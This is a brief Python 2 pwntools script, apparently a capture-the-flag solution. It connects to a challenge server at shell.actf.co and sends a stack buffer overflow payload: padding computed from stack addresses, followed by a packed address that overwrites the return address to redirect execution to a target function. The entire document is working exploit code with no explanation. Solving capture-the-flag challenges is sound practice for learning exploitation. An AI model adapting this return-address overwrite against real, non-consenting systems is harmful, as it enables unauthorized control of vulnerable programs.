# python2
# coding=utf-8
from pwn import *

target = 0x4011b6
start = 0x7ffffffedb50
ret = 0x7ffffffedbe8

pad = ret - start
r = remote('shell.actf.co', 19305)
for i in range(6):
  r.sendlineafter('Enter', '5')

r.sendlineafter('Enter', 'a'*pad + p32(target))
print r.recvall()
